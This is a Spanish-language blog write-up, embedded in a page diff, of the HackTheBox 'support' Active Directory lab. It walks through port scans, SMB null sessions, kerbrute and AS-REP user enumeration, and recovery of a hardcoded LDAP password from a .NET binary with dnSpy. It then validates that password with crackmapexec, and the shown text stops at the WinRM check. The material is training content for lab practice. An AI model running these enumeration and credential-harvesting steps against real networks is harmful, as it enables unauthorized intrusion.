@@ -1,0 +1,1106 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB support AD - Bast1ant1c</title>
+<meta name="description" content="Vamos a resolver la máquina support AD de HackTheBox. ¡Let’s hack!">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Bast1ant1c">
+<meta property="og:title" content="HTB support AD">
+<meta property="og:url" content="http://localhost:4000/support/">
+
+
+  <meta property="og:description" content="Vamos a resolver la máquina support AD de HackTheBox. ¡Let’s hack!">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/support/01-inicio.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-03-15T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/support/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Bast1ant1c",
+      "url": "http://localhost:4000/",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Bast1ant1c Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/" >Blog</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/halloffame/" >Hall of Fame</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Search</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000//" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">HTB support AD</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="BAST1ANT1C" itemprop="image" style="padding:25px;border:5px solid #434040;max-width:130px;border-radius:10%;">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">BAST1ANT1C</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Ethical hacker | eJPT
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/bast1ant1c" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/bast1ant1c" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://instagram.com/bast1ant1c" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="https://tiktok.com/@bast1ant1c" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-tiktok" aria-hidden="true"></i> TikTok
+          </a>
+        </li>
+      
+      
+      
+
+      
+
+      
+
+      
+
+
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB support AD">
+    <meta itemprop="description" content="Vamos a resolver la máquina support AD de HackTheBox. ¡Let’s hack!">
+    <meta itemprop="datePublished" content="March 15, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB support AD
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-03-15T00:00:00-05:00">March 15, 2023 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/assets/images/support/02-tarjeta.png" />
+</p>
+
+<p>¡Hola!
+En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">support</code> AD de <a href="https://hackthebox.com/">HackTheBox</a>.
+La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
+
+<h2 id="preparación">PREPARACIÓN</h2>
+
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">support</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack support
+<span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
+</code></pre></div></div>
+
+<h2 id="reconocimiento">RECONOCIMIENTO</h2>
+
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.11.174
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Detectando sistema operativo ...
+
+<span class="o">[</span>+] 10.10.11.174 <span class="nv">ttl</span><span class="o">=</span>127 <span class="o">&gt;&gt;</span> Windows
+</code></pre></div></div>
+
+<p>Identificamos que es una maquina <strong>Windows</strong> debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).</p>
+
+<blockquote>
+
+  <ul>
+    <li>TTL =&gt; 64	Linux</li>
+    <li>TTL =&gt; 128	Windows</li>
+  </ul>
+
+</blockquote>
+
+<p>Continuamos con la enumeración de los <strong>65535</strong> puertos en la máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.174 <span class="nt">-oG</span> ports | <span class="nb">grep </span>open
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49668/tcp open  unknown
+49674/tcp open  unknown
+49684/tcp open  unknown
+49700/tcp open  unknown
+</code></pre></div></div>
+
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49674,49684,49700 <span class="nt">-sCV</span> <span class="nt">-Pn</span> 10.10.11.174 <span class="nt">-oN</span> versions
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-02-18 02:11:10Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: support.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: support.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49684/tcp open  msrpc         Microsoft Windows RPC
+49700/tcp open  msrpc         Microsoft Windows RPC
+</code></pre></div></div>
+
+<h2 id="ad-domain-detection">AD DOMAIN DETECTION</h2>
+
+<p>Iniciamos con la detección del <code class="language-plaintext highlighter-rouge">dominio</code> donde inicialmente, por medio de la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code> enumeramos información necesaria para tener un mejor alcance a la máquina víctima.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.174
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.11.174    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Agregamos en el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
+nvim /etc/hosts
+10.10.11.174  DC DC.support.htb support.htb
+</code></pre></div></div>
+
+<h2 id="smb-null-session-enum">SMB NULL SESSION ENUM</h2>
+
+<p>Eumeramos información por smb null session</p>
+
+<h3 id="crackmapexec">CRACKMAPEXEC</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.174 <span class="nt">--shares</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.11.174    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.174    445    DC               <span class="o">[</span>-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED<span class="o">(</span>The remote user session has been deleted.<span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="smbclient--n">SMBCLIENT -N</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> 10.10.11.174 <span class="nt">-N</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+	C<span class="nv">$ </span>             Disk      Default share
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	support-tools   Disk      support staff tools
+	SYSVOL          Disk      Logon server share 
+</code></pre></div></div>
+
+<h3 id="smbmap--u-">SMBMAP -U ‘’</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.11.174 <span class="nt">-u</span> <span class="s1">''</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] IP: 10.10.11.174:445	Name: DC                                                
+</code></pre></div></div>
+
+<h3 id="smbmap--u-null">SMBMAP -U ‘NULL’</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.11.174 <span class="nt">-u</span> <span class="s1">'null'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="o">[</span>+] Guest session   	IP: 10.10.11.174:445	Name: DC                                                
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	NO ACCESS	Logon server share 
+	support-tools                                     	READ ONLY	support staff tools
+	SYSVOL                                            	NO ACCESS	Logon server share 
+</code></pre></div></div>
+
+<h2 id="archivo-userinfoexezip">ARCHIVO USERINFO.EXE.ZIP</h2>
+
+<p>En los recursos compartidos tenemos la oportunidad de ver un archivo interesante, por lo que procedemos a traerlo a nuestra máquina</p>
+
+<h3 id="acceso-a-smb">ACCESO A SMB</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.11.174/support-tools <span class="nt">-N</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">.</span>                                   D        0  Wed Jul 20 12:01:06 2022
+  ..                                  D        0  Sat May 28 06:18:25 2022
+  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 06:19:19 2022
+  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 06:19:55 2022
+  putty.exe                           A  1273576  Sat May 28 06:20:06 2022
+  SysinternalsSuite.zip               A 48102161  Sat May 28 06:19:31 2022
+  UserInfo.exe.zip                    A   277499  Wed Jul 20 12:01:07 2022
+  windirstat1_1_2_setup.exe           A    79171  Sat May 28 06:20:17 2022
+  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 06:19:43 2022
+</code></pre></div></div>
+<h3 id="obtener-archivo">OBTENER ARCHIVO</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> get UserInfo.exe.zip 
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getting file <span class="se">\U</span>serInfo.exe.zip of size 277499 as UserInfo.exe.zip <span class="o">(</span>123,3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 123,3 KiloBytes/sec<span class="o">)</span>
+</code></pre></div></div>
+<h3 id="salir-de-smb">SALIR DE SMB</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> <span class="nb">exit</span>
+</code></pre></div></div>
+
+<h2 id="userinfoexezip-enum">USERINFO.EXE.ZIP ENUM</h2>
+
+<p>Tenemos el archivo, ahora procedemos con <code class="language-plaintext highlighter-rouge">7z</code> a descomprimirlo y tratar de obtener algo de información con la utilidad <code class="language-plaintext highlighter-rouge">strings</code></p>
+
+<h3 id="listar-contenido-del-archivo">LISTAR CONTENIDO DEL ARCHIVO</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7z l UserInfo.exe.zip
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   Date      Time    Attr         Size   Compressed  Name
+<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
+2022-05-27 12:51:05 .....        12288         5424  UserInfo.exe
+2022-03-01 13:18:50 .....        99840        41727  CommandLineParser.dll
+2021-10-22 18:42:08 .....        22144        12234  Microsoft.Bcl.AsyncInterfaces.dll
+2021-10-22 18:48:04 .....        47216        21201  Microsoft.Extensions.DependencyInjection.Abstractions.dll
+2021-10-22 18:48:22 .....        84608        39154  Microsoft.Extensions.DependencyInjection.dll
+2021-10-22 18:51:24 .....        64112        29081  Microsoft.Extensions.Logging.Abstractions.dll
+2020-02-19 05:05:18 .....        20856        11403  System.Buffers.dll
+2020-02-19 05:05:18 .....       141184        58623  System.Memory.dll
+2018-05-15 08:29:44 .....       115856        32709  System.Numerics.Vectors.dll
+2021-10-22 18:40:18 .....        18024         9541  System.Runtime.CompilerServices.Unsafe.dll
+2020-02-19 05:05:18 .....        25984        13437  System.Threading.Tasks.Extensions.dll
+2022-05-27 11:59:39 .....          563          327  UserInfo.exe.config
+<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
+</code></pre></div></div>
+<h3 id="descomprimir-archivo">DESCOMPRIMIR ARCHIVO</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7z x UserInfo.exe.zip
+</code></pre></div></div>
+<h3 id="strings-enum">STRINGS ENUM</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings <span class="nt">-e</span> l UserInfo.exe
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@%1<span class="p">;</span>
+	5W5
+0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
+armando
+LDAP://support.htb
+support<span class="se">\l</span>dap
+</code></pre></div></div>
+
+<p>Por lo que vemos, aparentemente tenemos un usuario potencial <code class="language-plaintext highlighter-rouge">ldap</code> y <code class="language-plaintext highlighter-rouge">armando</code>, lo tenemos en cuenta para más adelante</p>
+
+<h2 id="rpcclient-null-session-enum">RPCCLIENT NULL SESSION ENUM</h2>
+
+<p>Eumeramos información por <code class="language-plaintext highlighter-rouge">rpcclient</code> null session, sin exito</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">''</span> 10.10.11.174 <span class="nt">-N</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>result was NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<h2 id="users-dictionary">USERS DICTIONARY</h2>
+
+<p>Vamos a crear una lista de usuarios con la información que tenemos por el momento</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nvim users.txt
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldap
+armando
+</code></pre></div></div>
+
+<h1 id="tgt-kerbrute-enum">TGT KERBRUTE ENUM</h1>
+
+<p>Procedemos a validar nuestra lista de usuarios para identificar un nuevo usuario</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute userenum <span class="nt">-d</span> support.htb <span class="nt">--dc</span> 10.10.11.174 users.txt
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2023/02/17 21:37:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	ldap@support.htb
+</code></pre></div></div>
+
+<p>Para esta ocasión vamos a usar un listado generico de usuarios <code class="language-plaintext highlighter-rouge">xato-net-10-million-usernames.tx</code> propio de <code class="language-plaintext highlighter-rouge">Seclists</code> para ver si podemos encontrar usuarios adicionales</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute userenum <span class="nt">-d</span> support.htb <span class="nt">--dc</span> 10.10.11.174 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2023/02/17 21:43:24 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	support@support.htb
+2023/02/17 21:43:28 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	guest@support.htb
+2023/02/17 21:43:58 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	administrator@support.htb
+</code></pre></div></div>
+
+<h2 id="tgt-getnpusers-enum">TGT GETNPUSERS ENUM</h2>
+
+<p>Obtenemos 4 usuarios validos con el ejercicio anterior! Ahora vamos a realizar la misma validación con la herramienta <code class="language-plaintext highlighter-rouge">GetNPUsers</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers support.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>-] User ldap doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+</span></code></pre></div></div>
+
+<p>Ahora validamos los usuarios del diccionario de <code class="language-plaintext highlighter-rouge">Seclists</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers support.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"not found"</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>-] User support doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User guest doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+</span></code></pre></div></div>
+<h2 id="updating-users-dictionary">UPDATING USERS DICTIONARY</h2>
+
+<p>Actualizamos el diccionario de usuarios que creamos anteriormente</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nvim users.txt
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldap@support.htb
+guest@support.htb
+support-tools@support.htb
+administrator@support.htb
+</code></pre></div></div>
+
+<h2 id="windows-machine-userinfoexe-enum">WINDOWS MACHINE USERINFO.EXE ENUM</h2>
+
+<p>Tenemos que entender que hace este programa a ver si podemos tener alguna información importante para continuar</p>
+
+<h3 id="maquina-atacante">MAQUINA ATACANTE</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+<h3 id="máquina-windows">MÁQUINA WINDOWS</h3>
+<blockquote>
+
+  <ul>
+    <li>Agregar DOMAIN al archivo HOSTS de WINDOWS</li>
+    <li>Prender OPENVPN</li>
+    <li>Descargar en navegador USERINFO.EXE.ZIP, descomprimir y comprender su funcionamiento
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://&lt;IP_ATACANTE&gt;/UserInfo.exe.zip
+</code></pre></div>      </div>
+    </li>
+  </ul>
+
+</blockquote>
+<p align="center">
+<img src="/assets/images/support/03-win.png" />
+</p>
+<blockquote>
+
+  <ul>
+    <li>Descargar en navegador y descomprimir DNSPY
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/dnSpy/dnSpy/releases/download/v6.1.8/dnSpy-netframework.zip
+</code></pre></div>      </div>
+    </li>
+    <li>Ejecutar DNSPY y cargar USERINFO.EXE
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UserInfo - UserInfo.exe - UserInfo.Services - LdapQuery
+</code></pre></div>      </div>
+    </li>
+    <li>Asignar un BREAK POINT en linea 13
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tecla f9
+</code></pre></div>      </div>
+    </li>
+    <li>Depurar el programa
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tecla f5
+Argumentos: find <span class="nt">-first</span> <span class="k">*</span> <span class="nt">-last</span> <span class="k">*</span>
+Aceptar
+</code></pre></div>      </div>
+    </li>
+  </ul>
+
+</blockquote>
+<p align="center">
+<img src="/assets/images/support/04-win.png" />
+</p>
+<blockquote>
+
+  <ul>
+    <li>Dar un paso adicional en el DEBUG
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tecla f10
+</code></pre></div>      </div>
+    </li>
+    <li>Se detecta la variable PASSWORD y una contraseña</li>
+  </ul>
+
+</blockquote>
+<p align="center">
+<img src="/assets/images/support/05-win.png" />
+</p>
+<blockquote>
+
+  <ul>
+    <li>Apagar OPENVPN</li>
+    <li>Volvemos a nuestra máquina atacante</li>
+  </ul>
+
+</blockquote>
+
+<h2 id="validating-ldap-credentials">VALIDATING LDAP CREDENTIALS</h2>
+
+<p>Antes que cualquier cosa, debemos volver a activar nuestra vpn en la máquina atacante con <code class="language-plaintext highlighter-rouge">OpenVPN</code>, luego de esto procedemos a validar las credenciales obtenidas anteriormente</p>
+
+<h3 id="validar-creds-smb">VALIDAR CREDS SMB</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.174 <span class="nt">-u</span> ldap <span class="nt">-p</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.11.174    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.174    445    DC               <span class="o">[</span>+] support.htb<span class="se">\l</span>dap:nvEfEK16^1aM4<span class="nv">$e7AclUf8x$tRWxPWO1</span>%lmz 
+</code></pre></div></div>
+
+<h3 id="validar-creds-winrm">VALIDAR CREDS WINRM</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.11.174 <span class="nt">-u</span> ldap <span class="nt">-p</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span>
+</code></pre></div></div>
